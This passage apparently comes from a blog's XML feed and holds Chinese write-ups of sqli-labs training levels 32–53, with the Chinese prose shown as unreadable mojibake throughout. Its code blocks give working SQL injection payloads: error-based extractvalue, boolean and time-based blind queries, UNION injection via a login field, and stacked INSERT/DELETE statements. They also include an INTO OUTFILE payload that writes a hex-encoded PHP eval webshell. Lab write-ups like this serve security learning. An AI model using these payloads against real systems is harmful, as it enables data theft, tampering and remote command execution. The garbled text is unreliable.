å<code>.php::$DATA</code>å˜ä¸º.php</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> é¶åœº </category>
          
          <category> upload </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs less46-53</title>
      <link href="/2023/12/14/sqlilabs-less46-53/"/>
      <url>/2023/12/14/sqlilabs-less46-53/</url>
      
        <content type="html"><![CDATA[<h1 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h1><p>è¿™é“é¢˜ç›®æˆ‘ä»¬æ‰“å¼€æºç ï¼Œå¯ä»¥å‘ç°ä»–çš„æŸ¥è¯¢è¯­å¥å‘ç”Ÿäº†å¾ˆå¤§çš„å˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥å‘å…ˆè¿™ä¸ªè¯­å¥ç”±<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=&#x27;$id&#x27;</span><br></pre></td></tr></table></figure><br>å˜æˆäº†<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user order by $srot</span><br></pre></td></tr></table></figure><br>é‚£ä¹ˆæˆ‘æ¥ä»‹ç»ä»¥ä¸‹order by<br>é¦–å…ˆorder byæ˜¯ä¸€ä¸ªmysqlçš„æ’åºè¯­å¥ï¼Œè€Œæˆ‘ä»¬å¸¸ç”¨çš„order by 1ï¼Œorder by 3ä¹‹ç±»çš„ï¼ŒåŸç†å°±æ˜¯order byçš„æ’åˆ—æ¦‚åŠŸèƒ½ï¼Œorder by 3çš„æ„æ€å°±æ˜¯å°†selectæŸ¥è¯¢çš„åˆ—çš„ç¬¬ä¸‰ä¸ªè¿›è¡Œæ’åºï¼Œé‚£ä¹ˆå¦‚æœè¾“å…¥çš„æ•°å¤§äºæŸ¥è¯¢çš„åˆ—æ•°å°±ä¼šæŠ¥é”™ï¼Œè¿™å°±æ˜¯order byæŸ¥è¯¢åˆ—æ•°çš„åŸç†ã€‚<br>order byçš„åŸºæœ¬è¯­å¥å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from users order by username,password ASC|DESC</span><br></pre></td></tr></table></figure><br>ASCä¸ºæ­£åºè€ŒDESCä¸ºé€†åº<br>é‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆåˆ©ç”¨order byæ¥è¿›è¡Œæ³¨å…¥å‘¢ï¼Ÿ<br>1ï¼Œç»è¿‡å°è¯•order_byåæ— æ³•è·Ÿunionè¿›è¡Œæ³¨å…¥<br>2ï¼Œorder byåå¯ä»¥ä½¿ç”¨andå’Œorè¯­å¥æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> database())))</span><br></pre></td></tr></table></figure><br>3.å¯ä»¥é‡‡å–ç›²æ³¨<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(2))</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å¦ä¸€ç§ç›²æ³¨ï¼Œåˆ©ç”¨ifæ­£ç¡®è¿”å›1é”™è¯¯è¿”å›2<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=if(ascii(substr((select database()),1,1))&gt;100,1,2)</span><br></pre></td></tr></table></figure><br>4,order byåè¿˜å¯ä»¥ä½¿ç”¨into outfileæ¥è¿›è¡Œè¿‡æ³¨å…¥<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">into</span> outfile <span class="string">&#x27;D:\\phpstudy_pro\\WWW\\sqli\\Less-46\\1.php&#x27;</span>  lines terminated <span class="keyword">by</span> <span class="number">0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e</span></span><br></pre></td></tr></table></figure><br>0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3eä¸ºä¸€å¥è¯æœ¨é©¬çš„16è¿›</p><h1 id="less-47ï¼Œ48ï¼Œ49"><a href="#less-47ï¼Œ48ï¼Œ49" class="headerlink" title="less 47ï¼Œ48ï¼Œ49"></a>less 47ï¼Œ48ï¼Œ49</h1><p>47ä¸ºæ•°å€¼å‹çš„ç›²æ³¨<br>48ä¸ºæ•°å€¼å‹çš„ç›²æ³¨<br>49ä¸ºâ€™é—­åˆçš„ç›²æ³¨</p><h1 id="less-50-51-52-53"><a href="#less-50-51-52-53" class="headerlink" title="less 50,51,52,53"></a>less 50,51,52,53</h1><p>50ä¸ºæ•°å­—å‹çš„æŠ¥é”™æ³¨å…¥ï¼Œ51ä¸ºå•å¼•å·æŠ¥é”™æ³¨å…¥ï¼Œ52æ•°å­—å‹çš„ç›²æ³¨ï¼Œ53å•å¼•å·çš„ç›²æ³¨<br>è¿™å‡ å…³å’Œå‰é¢å‡ å…³çš„åŒºåˆ«ä¸ºï¼Œå…¶æŸ¥è¯¢å‡½æ•°ä¸ºmysqli_multi_query()å¯ä»¥è¿›è¡Œå †å æ³¨å…¥</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åˆ·äº†è¿™ä¹ˆå°±ç»ˆäºåˆ·å®Œäº†sqli-labsçš„å‰ä¸‰é¡µäº†ï¼Œåé¢çš„ç¬¬4é¡µå¹¶æ²¡æœ‰æ–°çš„çŸ¥è¯†äº†ï¼Œç¬¬4é¡µä¸»è¦æ˜¯ç”¨äºç»ƒä¹ </p><h2 id="ä¸€ï¼šåŸºç¡€æ³¨å…¥æ–¹å¼"><a href="#ä¸€ï¼šåŸºç¡€æ³¨å…¥æ–¹å¼" class="headerlink" title="ä¸€ï¼šåŸºç¡€æ³¨å…¥æ–¹å¼"></a>ä¸€ï¼šåŸºç¡€æ³¨å…¥æ–¹å¼</h2><p>1ï¼šåˆ¤æ–­å…¶ä¸ºå­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œå¦‚æœæ˜¯å­—ç¬¦å‹åˆ™åˆ¤æ–­å…¶é—­åˆæ–¹å¼<code>&#39;</code> <code>&quot;</code> <code>&#39;)</code> <code>&quot;)</code>,å…¶ä¸­æ‹¬å·æ•°å¯ä»¥å‘ç”Ÿæ”¹å˜<br>2,åˆ¤æ–­æ³¨å…¥æ–¹å¼ï¼Œæ ¹æ®æ˜¯å¦å›æ˜¾ï¼Œå›æ˜¾æ–¹å¼æ¥è¿›è¡Œåˆ¤æ–­<br>ï¼ˆ1ï¼‰unionæ³¨å…¥ï¼šç”¨äºæ³¨å…¥å¯ä»¥å›æ˜¾æŸ¥è¯¢å†…å®¹çš„é¡µé¢<br>ï¼ˆ2ï¼‰æŠ¥é”™æ³¨å…¥ï¼šç”¨äºæ³¨å…¥å¯ä»¥å›æ˜¾æŠ¥é”™çš„æ³¨å…¥æˆ–è€…åç«¯è¯­å¥ä¸ºorder byçš„<br>ï¼ˆ3ï¼‰å¸ƒå°”ç›²æ³¨ï¼šç”¨äºåªå›æ˜¾æ­£ç¡®é”™è¯¯ä¸¤ç§ä¿¡æ¯çš„é¡µé¢<br>ï¼ˆ4ï¼‰æ—¶é—´ç›²æ³¨ï¼Œç”¨äºæ³¨å…¥æ— ä»»ä½•å›æ˜¾çš„é¡µé¢</p><h2 id="äºŒï¼Œç‰¹æ®Šæ³¨å…¥æ–¹å¼"><a href="#äºŒï¼Œç‰¹æ®Šæ³¨å…¥æ–¹å¼" class="headerlink" title="äºŒï¼Œç‰¹æ®Šæ³¨å…¥æ–¹å¼"></a>äºŒï¼Œç‰¹æ®Šæ³¨å…¥æ–¹å¼</h2><p>ï¼ˆ1ï¼‰å„ç§æ ‡å¤´çš„æ³¨å…¥å¦‚æœåç«¯è¯­å¥ä¸ºæ’å…¥(ä¹Ÿå°±æ˜¯insertè¯­å¥)æ ‡å¤´ï¼ˆå¦‚uaå¤´ï¼Œcookieå¤´ç­‰ï¼‰çš„selectè¯­å¥åˆ™ä½¿ç”¨è¯·æ±‚å¤´æ³¨å…¥<br>ï¼ˆ2ï¼‰äºŒæ¬¡æ³¨å…¥ï¼Œåœ¨æ³¨å†Œç­‰åªå¯¹å­—ç¬¦è¿›è¡Œè½¬ä¹‰ä¾¿å­˜å…¥æ•°æ®åº“çš„è¯­å¥ä¸­å¯ä»¥ä½¿ç”¨äºŒæ¬¡æ³¨å…¥å°†ä¸€äº›è„è¯­å¥ä¼ å…¥æ•°æ®åº“åœ¨äºŒæ¬¡è°ƒç”¨æ—¶å°±æœ‰å¯ä»¥ä¼šå±å®³æ•°æ®åº“<br>ï¼ˆ3ï¼‰å®½å­—èŠ‚æ³¨å…¥ï¼Œåœ¨ä½¿ç”¨å‡½æ•°å°†â€™è½¬ä¹‰è¿‡æ»¤åå¦‚æœæ•°æ®åº“å¯ä»¥ä½¿ç”¨gbkç¼–ç é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨å®½å­—ç¬¦æ³¨å…¥æ¥ç»•è¿‡\,å› ä¸º%df\å°±æ˜¯%df5cåœ¨gbkç¼–ç ä¸­æ˜¯ä¸ªæ±‰å­—<br>ï¼ˆ4ï¼‰å †å æ³¨å…¥ï¼Œé‡åˆ°mysqli_multi_query()è¿™ç§å¯ä»¥æŸ¥è¯¢å¤šæ¡è¯­å¥çš„å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨å †å æ³¨å…¥æ¥ä¿®æ”¹æ•°æ®åº“<br>ï¼ˆ5ï¼‰into outfileæ¥æ’å…¥æœ¨é©¬æ–‡ä»¶æ¥è·å–æƒé™</p><h2 id="ä¸‰æ³¨å…¥çš„åŸºæœ¬é˜²å¾¡æ–¹å¼"><a href="#ä¸‰æ³¨å…¥çš„åŸºæœ¬é˜²å¾¡æ–¹å¼" class="headerlink" title="ä¸‰æ³¨å…¥çš„åŸºæœ¬é˜²å¾¡æ–¹å¼"></a>ä¸‰æ³¨å…¥çš„åŸºæœ¬é˜²å¾¡æ–¹å¼</h2><p>1ã€ä½¿ç”¨åŒæœåŠ¡å™¨è¿›è¡Œé˜²å¾¡<br>2ã€è¿‡æ»¤ä¸€äº›å…³é”®å­—ç¬¦è¿›è¡Œé˜²å¾¡<br>3ã€æ·»åŠ \è¿›è¡Œè½¬ä¹‰<br><img src="2.png" alt="Alt text"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> é¶åœº </category>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs less38-45</title>
      <link href="/2023/12/13/sqlilabs-less38-45/"/>
      <url>/2023/12/13/sqlilabs-less38-45/</url>
      
        <content type="html"><![CDATA[<h1 id="less-38"><a href="#less-38" class="headerlink" title="less 38"></a>less 38</h1><p>æˆ‘ä»¬æ‰“å¼€æºç <br></p><h2 id="çœ‹åˆ°ä¸€ä¸ªå«mysql-connect-çš„å‡½æ•°æ‰“å¼€åˆ°ä¸€ä¸ªmysqlæœåŠ¡å™¨çš„æ–°è¿æ¥ï¼Œè¿”å›ä¸€ä¸ªä»£è¡¨åˆ°-MySQL-æœåŠ¡å™¨çš„è¿æ¥çš„å¯¹è±¡ã€‚"><a href="#çœ‹åˆ°ä¸€ä¸ªå«mysql-connect-çš„å‡½æ•°æ‰“å¼€åˆ°ä¸€ä¸ªmysqlæœåŠ¡å™¨çš„æ–°è¿æ¥ï¼Œè¿”å›ä¸€ä¸ªä»£è¡¨åˆ°-MySQL-æœåŠ¡å™¨çš„è¿æ¥çš„å¯¹è±¡ã€‚" class="headerlink" title="çœ‹åˆ°ä¸€ä¸ªå«mysql_connect()çš„å‡½æ•°æ‰“å¼€åˆ°ä¸€ä¸ªmysqlæœåŠ¡å™¨çš„æ–°è¿æ¥ï¼Œè¿”å›ä¸€ä¸ªä»£è¡¨åˆ° MySQL æœåŠ¡å™¨çš„è¿æ¥çš„å¯¹è±¡ã€‚"></a><strong>çœ‹åˆ°ä¸€ä¸ªå«mysql_connect()çš„å‡½æ•°æ‰“å¼€åˆ°ä¸€ä¸ªmysqlæœåŠ¡å™¨çš„æ–°è¿æ¥ï¼Œè¿”å›ä¸€ä¸ªä»£è¡¨åˆ° MySQL æœåŠ¡å™¨çš„è¿æ¥çš„å¯¹è±¡ã€‚</strong></h2><p>mysql_connect(host,username,password,dbname,prok,socket)<br>hostï¼šå¿…å†™ï¼Œè¡¨ç¤ºä¸€ä¸ªæœåŠ¡å™¨çš„ä¸»æœºåŸŸå<br>username:å¿…å†™ï¼Œè¡¨ç¤ºmysqlæœåŠ¡å™¨çš„ç”¨æˆ·å<br>passwordï¼šå¯å†™ï¼Œè¡¨ç¤ºå¯†ç <br>dbnameï¼šå¯é€‰ï¼Œè¡¨ç¤ºè¦è¿æ¥çš„æ•°æ®åº“<br>prokï¼šå¯é€‰ï¼Œè¡¨ç¤ºmysqlæœåŠ¡å™¨çš„è¿æ¥ç«¯å£<br>socket:å¯é€‰ï¼Œè¡¨ç¤ºæ‰€è¦ä½¿ç”¨çš„socketå’Œå·²å‘½åçš„pipe<br>socketå°±æ˜¯æˆ‘ä»¬åœ¨å‘é€æ—¶ï¼Œå¸®åŠ©æˆ‘ä»¬å‘é€ä¿æŠ¤æˆ‘ä»¬æ•°æ®ï¼Œæ‰“åŒ…æ•°æ®ç­‰çš„ä¸œè¥¿ï¼Œå°±åƒä¸€ä¸ªç‰©æµå…¬å¸ä¸€æ ·å½“æˆ‘ä»¬å‘é€æ—¶å¸®æˆ‘ä»¬è¿›è¡Œä¸€ç³»åˆ—æ“ä½œ<br><img src="2.png" alt="Alt text"></p><h2 id="2-mysql-connect-errno-è¯¥å‡½æ•°äºmysql-connect-æœ‰å…³è¿ï¼Œä¼šæ”¾å›ä¸€ä¸ªé”™è¯¯è¿æ¥çš„ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿æ¥é”™è¯¯å°±è¿”å›0"><a href="#2-mysql-connect-errno-è¯¥å‡½æ•°äºmysql-connect-æœ‰å…³è¿ï¼Œä¼šæ”¾å›ä¸€ä¸ªé”™è¯¯è¿æ¥çš„ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿æ¥é”™è¯¯å°±è¿”å›0" class="headerlink" title="2.mysql_connect_errno()è¯¥å‡½æ•°äºmysql_connect()æœ‰å…³è¿ï¼Œä¼šæ”¾å›ä¸€ä¸ªé”™è¯¯è¿æ¥çš„ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿æ¥é”™è¯¯å°±è¿”å›0"></a>2.mysql_connect_errno()è¯¥å‡½æ•°äºmysql_connect()æœ‰å…³è¿ï¼Œä¼šæ”¾å›ä¸€ä¸ªé”™è¯¯è¿æ¥çš„ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿æ¥é”™è¯¯å°±è¿”å›0</h2><h2 id="3-mysql-select-db-æŸ¥è¯¢æ‰€è¿æ¥æ•°æ®åº“çš„çš„ä¸€äº›phpä»£ç "><a href="#3-mysql-select-db-æŸ¥è¯¢æ‰€è¿æ¥æ•°æ®åº“çš„çš„ä¸€äº›phpä»£ç " class="headerlink" title="3.mysql_select_db()æŸ¥è¯¢æ‰€è¿æ¥æ•°æ®åº“çš„çš„ä¸€äº›phpä»£ç "></a>3.mysql_select_db()æŸ¥è¯¢æ‰€è¿æ¥æ•°æ®åº“çš„çš„ä¸€äº›phpä»£ç </h2><p>è¯­æ³•<br>mysql_select_db(connection,dbname)<br>connection:å¿…å†™ï¼Œè§„å®šè¦ä½¿ç”¨çš„mysqlçš„è¿æ¥ï¼Œä¹Ÿå°±æ˜¯MySQL_connect()çš„è¿”å›å€¼</p><h2 id="4-mysqli-error-å‡½æ•°è¿”å›æœ€è¿‘è°ƒç”¨å‡½æ•°çš„æœ€åä¸€ä¸ªé”™è¯¯æè¿°ã€‚ä¹Ÿå°±æ˜¯æŠ¥é”™"><a href="#4-mysqli-error-å‡½æ•°è¿”å›æœ€è¿‘è°ƒç”¨å‡½æ•°çš„æœ€åä¸€ä¸ªé”™è¯¯æè¿°ã€‚ä¹Ÿå°±æ˜¯æŠ¥é”™" class="headerlink" title="4.mysqli_error() å‡½æ•°è¿”å›æœ€è¿‘è°ƒç”¨å‡½æ•°çš„æœ€åä¸€ä¸ªé”™è¯¯æè¿°ã€‚ä¹Ÿå°±æ˜¯æŠ¥é”™"></a>4.mysqli_error() å‡½æ•°è¿”å›æœ€è¿‘è°ƒç”¨å‡½æ•°çš„æœ€åä¸€ä¸ªé”™è¯¯æè¿°ã€‚ä¹Ÿå°±æ˜¯æŠ¥é”™</h2><p>è¯­æ³•mysqli_error(connection)connectionä¸€ä¸ªmysqlæœåŠ¡å™¨çš„è¿æ¥</p><h2 id="5-mysqli-close-connection-å‡½æ•°å…³é—­å…ˆå‰æ‰“å¼€çš„æ•°æ®åº“è¿æ¥ã€‚æˆåŠŸè¿”å›trueé”™è¯¯false"><a href="#5-mysqli-close-connection-å‡½æ•°å…³é—­å…ˆå‰æ‰“å¼€çš„æ•°æ®åº“è¿æ¥ã€‚æˆåŠŸè¿”å›trueé”™è¯¯false" class="headerlink" title="5.mysqli_close(connection); å‡½æ•°å…³é—­å…ˆå‰æ‰“å¼€çš„æ•°æ®åº“è¿æ¥ã€‚æˆåŠŸè¿”å›trueé”™è¯¯false"></a>5.mysqli_close(connection); å‡½æ•°å…³é—­å…ˆå‰æ‰“å¼€çš„æ•°æ®åº“è¿æ¥ã€‚æˆåŠŸè¿”å›trueé”™è¯¯false</h2><h2 id="6-mysqli-multi-query-æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢"><a href="#6-mysqli-multi-query-æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢" class="headerlink" title="6.mysqli_multi_query():æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢"></a>6.mysqli_multi_query():æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢</h2><p>è¯­æ³•ï¼šmysqli_multi_query(connection,query)<br>connection:å¿…é€‰ï¼›è§„å®šä½¿ç”¨çš„MySQLè¿æ¥<br>query:å¿…é€‰ï¼›è§„å®šä¸€ä¸ªæˆ–è€…å¤šä¸ªæŸ¥è¯¢ï¼›ä¸­é—´ç”¨åˆ†å·è¿æ¥</p><h2 id="7-mysqli-more-results-æ£€æŸ¥æ˜¯å¦æœ‰æ›´å¤šæŸ¥è¯¢ç»“æœ"><a href="#7-mysqli-more-results-æ£€æŸ¥æ˜¯å¦æœ‰æ›´å¤šæŸ¥è¯¢ç»“æœ" class="headerlink" title="7.mysqli_more_results()æ£€æŸ¥æ˜¯å¦æœ‰æ›´å¤šæŸ¥è¯¢ç»“æœ"></a>7.mysqli_more_results()æ£€æŸ¥æ˜¯å¦æœ‰æ›´å¤šæŸ¥è¯¢ç»“æœ</h2><h2 id="8ï¼šmysqli-store-result-å°†æŸ¥è¯¢ç»“æœä¿å­˜åˆ°å˜é‡ä¸­"><a href="#8ï¼šmysqli-store-result-å°†æŸ¥è¯¢ç»“æœä¿å­˜åˆ°å˜é‡ä¸­" class="headerlink" title="8ï¼šmysqli_store_result()å°†æŸ¥è¯¢ç»“æœä¿å­˜åˆ°å˜é‡ä¸­"></a>8ï¼šmysqli_store_result()å°†æŸ¥è¯¢ç»“æœä¿å­˜åˆ°å˜é‡ä¸­</h2><h2 id="9-mysqli-fetch-row-å°†æŸ¥è¯¢ç»“æœä¸€è¡Œä¸€è¡Œçš„æå–ä¸ºæ•°ç»„"><a href="#9-mysqli-fetch-row-å°†æŸ¥è¯¢ç»“æœä¸€è¡Œä¸€è¡Œçš„æå–ä¸ºæ•°ç»„" class="headerlink" title="9:mysqli_fetch_row()å°†æŸ¥è¯¢ç»“æœä¸€è¡Œä¸€è¡Œçš„æå–ä¸ºæ•°ç»„"></a>9:mysqli_fetch_row()å°†æŸ¥è¯¢ç»“æœä¸€è¡Œä¸€è¡Œçš„æå–ä¸ºæ•°ç»„</h2><h1 id="å †å æ³¨å…¥çš„åŸç†ã€‚"><a href="#å †å æ³¨å…¥çš„åŸç†ã€‚" class="headerlink" title="å †å æ³¨å…¥çš„åŸç†ã€‚"></a>å †å æ³¨å…¥çš„åŸç†ã€‚</h1><p>mysqli_multi_query()ç”±äºè¿™ä¸ªè¯­å¥å¯ä»¥æŸ¥è¯¢å¤šä¸ªsqlè¯­å¥ï¼Œé‚£ä¹ˆå°†ç¬¬ä¸€ä¸ªsqlè¯­å¥ä»¥åˆ†å·ç»“æŸåå†å†™ä¸‹å¦ä¸€ä¸ªsqlè¯­å¥è¿™æ—¶å€™å°±ä¼šæ‰§è¡Œä¸¤ä¸ªè¯­å¥ï¼Œè€Œç¬¬äºŒä¸ªsqlè¯­å¥ä¸ä»…å¯ä»¥æŸ¥è¯¢è¿˜å¯ä»¥å¯¹æ•°æ®åº“è¿›è¡Œä¿®æ”¹ã€‚</p><h1 id="å †å æ³¨å…¥çš„æ³¨å…¥æ¡ä»¶"><a href="#å †å æ³¨å…¥çš„æ³¨å…¥æ¡ä»¶" class="headerlink" title="å †å æ³¨å…¥çš„æ³¨å…¥æ¡ä»¶"></a>å †å æ³¨å…¥çš„æ³¨å…¥æ¡ä»¶</h1><p>æˆ‘ä»¬éƒ½çŸ¥é“å †å æ³¨å…¥æ˜¯ç”±äºsqlæœåŠ¡å™¨è§£æå¤šä¸ªsqlè¯­å¥é€ æˆçš„ï¼Œé‚£ä¹ˆåªè¦æœåŠ¡å™¨å¯ä»¥æŸ¥è¯¢å¤šä¸ªè¯­å¥å°±å­˜åœ¨å †å æ³¨å…¥ã€‚ä¹Ÿå°±æ˜¯åå°çš„æŸ¥è¯¢å‡½æ•°æ˜¯ç±»ä¼¼äºmysqli_multi_query()çš„ã€‚äºŒmysqli_query()åªèƒ½æ‰§è¡Œå•sqlè¯­å¥ã€‚<br>å¢åˆ æ”¹æŸ¥çš„è¯­å¥è¯·æŸ¥çœ‹è¿™ä¸ªè¯­å¥<a href="../../../../2023/11/09/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/">sqlæ³¨å…¥çš„å­¦ä¹ </a><br>æ”¹é¢˜ç›®å¯ä»¥ç›´æ¥ä½¿ç”¨å †å æ³¨å…¥ä¿®æ”¹æ•°æ®<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;; insert into users(username,password,id)value(&#x27;dazhuang&#x27;,&#x27;111&#x27;,100)--+</span><br></pre></td></tr></table></figure><br><img src="/2023/12/13/sqlilabs-less38-45/38-3.png" class="" title="Alt text"><br>è¾“å…¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;delete from users where username=&#x27;dazhuang&#x27;</span><br></pre></td></tr></table></figure><br><img src="/2023/12/13/sqlilabs-less38-45/38-4.png" class="" title="Alt text"><br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸçš„å¢æ·»å’Œåˆ é™¤äº†æ•°æ®åº“çš„æ•°æ®<br>è¿™æ ·å°±å¯ä»¥å‘æ•°æ®åº“æ’å…¥å†…å®¹äº†</p><h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p>äº38ä¹Ÿä¸€æ ·åªæ˜¯é—­åˆä¸åŒ</p><h1 id="less40å’Œ41"><a href="#less40å’Œ41" class="headerlink" title="less40å’Œ41"></a>less40å’Œ41</h1><p>40ä¸ºå•å¼•å·ç›²æ³¨ï¼Œ41ä¸ºå•å¼•å·unionæ³¨å…¥</p><h1 id="less42"><a href="#less42" class="headerlink" title="less42"></a>less42</h1><p>ä¸ºpostçš„æ³¨å…¥æˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°ï¼Œusernameå­˜åœ¨è¿‡æ»¤å‡½æ•°mysqli_real_escape_string()ä¼šè½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚æ‰€ä»¥æ³¨å…¥ç”µä½password<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=admin&#x27; union select 1,(select database()),3--+&amp;login_user=admin&amp;mysubmit=Login</span><br></pre></td></tr></table></figure></p><h1 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h1><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·åªæ˜¯é—­åˆæ–¹å¼ä¸åŒä½â€™)</p><h1 id="less44"><a href="#less44" class="headerlink" title="less44"></a>less44</h1><p>è¯¥é¢˜ç›®ä¸ºå•å­—ç¬¦ç›²æ³¨</p><h1 id="less45"><a href="#less45" class="headerlink" title="less45"></a>less45</h1><p>ä¸ºå•å¼•å·æ‹¬å·ç›²æ³¨</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> é¶åœº </category>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs less32-37å®½å­—èŠ‚ç»•è¿‡</title>
      <link href="/2023/12/12/sqli-labs-less32-37%E5%AE%BD%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/"/>
      <url>/2023/12/12/sqli-labs-less32-37%E5%AE%BD%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="less32"><a href="#less32" class="headerlink" title="less32"></a>less32</h1><p>è¿™å…³æˆ‘ä»¬ç›´æ¥æŸ¥çœ‹æºç <br><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¼•å…¥å¯gbkç¼–ç </p><h2 id="gbkç¼–ç "><a href="#gbkç¼–ç " class="headerlink" title="gbkç¼–ç "></a>gbkç¼–ç </h2><p>ç¼–ç åŒ…æ‹¬äº†åŒå­—èŠ‚å­—ç¬¦é›†å’Œå•å­—èŠ‚å­—ç¬¦é›†<br>å•å­—ç¬¦ç¼–ç ï¼šå¦‚asciiç ï¼Œå•å­—èŠ‚å­—ç¬¦é›†è¡¨ç¤ºå…¶å†…éƒ¨çš„æ‰€ä»¥å­—ç¬¦éƒ½æ˜¯ç”±å•å­—èŠ‚è¡¨ç¤ºçš„<br>åŒå­—èŠ‚å­—ç¬¦é›†ï¼šä¹Ÿç§°ä¸ºå®½å­—ç¬¦ï¼ŒåŒå­—èŠ‚å­—ç¬¦é›†è¡¨ç¤ºå…¶å†…éƒ¨å­—ç¬¦æ˜¯ç”±ä¸¤ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºçš„ï¼Œå…¶å¯¼è‡´çš„æ¼æ´å¤§å¤šæ˜¯å› ä¸ºæœåŠ¡å™¨é”™è¯¯çš„å°†ä¸¤ä¸ªå•å­—èŠ‚é”™è¯¯çš„ç¼–ç ä¸ºå®½å­—ç¬¦<br>å®½å­—ç¬¦ï¼šç”¨å¤šä¸ªå­—èŠ‚æ¥è¡¨ç¤ºçš„å­—ç¬¦é›†<br>å®½å­—èŠ‚ï¼š:GB2312ã€GBKã€GB18030ã€BIG5ã€ShiftJISéƒ½æ˜¯å®½å­—èŠ‚ï¼Œå…¶æ˜¯ç”±ä¸¤ä¸ªå•å­—èŠ‚æ¥è¡¨ç¤ºã€‚å…¶æ¼æ´åŸºæœ¬æ˜¯ç”±äºè¾“å…¥å¤šä¸ªå•å­—èŠ‚å¯¼è‡´å•å­—èŠ‚è¢«å½“æˆå®½å­—èŠ‚å¯¼è‡´çš„ï¼Œ<strong>gbkç åªæœ‰å½“å‰ä¸€ä¸ªå­—èŠ‚çš„asciiç å€¼å¤§äº128æ‰åˆ°æ±‰å­—çš„èŒƒå›´</strong></p><p>å‡½æ•°<code>preg_replace($str,$str1,$str2)</code>è¡¨ç¤ºäº¤æ¢éœ€è¦è¿‡æ»¤çš„å­—ç¬¦,å³åˆ¤æ–­<code>str2</code>é‡Œæœ‰æ²¡æœ‰<code>str</code>ç”±åˆ™å°†<code>str</code>è½¬æ¢æˆ<code>str1</code><br><code>preg_quote($str)</code>ä¼šå°†å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰ç‰¹æ®Šå­—ç¬¦å‰æ·»åŠ ä¸€ä¸ª\ä½¿å…¶å®ä½“åŒ–ã€‚<br>è¿™æ ·å°±å¯¼è‡´äº†æˆ‘ä»¬è¾“å…¥â€™ä¼šè¢«æ·»åŠ 